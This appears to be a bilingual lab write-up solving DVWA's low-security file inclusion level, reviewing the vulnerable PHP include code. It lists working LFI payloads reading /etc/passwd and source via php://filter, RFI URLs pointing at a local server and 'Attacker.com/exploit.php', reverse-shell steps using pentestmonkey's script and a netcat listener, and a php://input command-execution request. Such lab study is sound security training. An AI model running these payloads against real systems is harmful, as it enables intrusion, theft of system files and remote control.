# File Inclusion - Low

## View Source

```PHP
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?> 
```

### Include

```PHP
if( isset( $file ) )
    include( $file );
else {
    header( 'Location:?page=include.php' );
    exit;
}
```
- `docker exec -it dvwa /bin/bash`
- `vim /var/www/html/vulnerabilities/fi/index.php`
    - https://github.com/digininja/DVWA/blob/master/vulnerabilities/fi/index.php#L36
- [`include()`](https://www.php.net/manual/zh/function.include.php)
    - 引入並運行指定檔案

## Code Review

- 透過輸入的 `page=` 來設置 `$file` 變數
- 若有設置 `$file` 就引入檔案

## Answer

- 頁面總共有三個 *file_.php* 的超連結，可以觀察到網址從
- `http://127.0.0.1/vulnerabilities/fi/?page=include.php` 變成 `http://127.0.0.1/vulnerabilities/fi/?page=file1.php`
- 也就是差在 `page=` 後面接的不同，就可以操控引入的檔案

### Example

- 可搭配 *PHP* 的偽協議
    - https://www.php.net/manual/en/wrappers.php
    - E.g., *file:// — Accessing local filesystem*, *php:// — Accessing various I/O streams*
#### LFI

- 可以透過此漏洞來查看系統相關訊息
    - E.g., `/etc/passwd`, `/etc/shadow`, `/etc/group` 等
```
http://127.0.0.1/vulnerabilities/fi/?page=../../hackable/flags/fi.php
http://127.0.0.1/vulnerabilities/fi/?page=../../../../../etc/passwd
http://127.0.0.1/vulnerabilities/fi/?page=/etc/passwd
http://127.0.0.1/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=./include.php
```

#### RFI

- 漏洞利用可參考 *Intro.md* 的 *Reference*
    1. `docker exec -it dvwa /bin/bash`
    2. `git clone https://github.com/pentestmonkey/php-reverse-shell.git`
        - `apt-get install git-all`
    3. `python3 -m http.server`
        - `apt-get install python3`
    4. 另一個終端機輸入 `nc -nlvp 1234`
        - `apt-get install netcat`
    5. 回到網頁 `http://127.0.0.1/vulnerabilities/fi/?page=http://0.0.0.0:8000/php-reverse-shell.php`
```
http://127.0.0.1/vulnerabilities/fi/?page=http://www.google.com
http://127.0.0.1/vulnerabilities/fi/?page=http://0.0.0.0:8000/RFI.php
http://127.0.0.1/vulnerabilities/fi/?page=http://0.0.0.0:8000/ReverseShell.php
http://127.0.0.1/vulnerabilities/fi/?page=http://Attacker.com/exploit.php
```

#### Burp Suite

1. 使用 *Burp Suite* 的 *Proxy* 來攔截 *request* 封包
2. 改成 `GET /vulnerabilities/fi/?page=php://input&cmd=pwd HTTP/1.1`
3. 底下新加 `<?php system($_GET['cmd']); ?>`

### Note

> 有 *file4.php* 是彩蛋 (？)
- `http://127.0.0.1/vulnerabilities/fi/?page=file4.php`

> 透過可引入 *google.com* 來證明能夠 *RFI*，但如果是使用 *docker* 架設 *DVWA* 的話，*RFI* 的 *python http server* 和檔案可放在 *docker container* 裡面來嘗試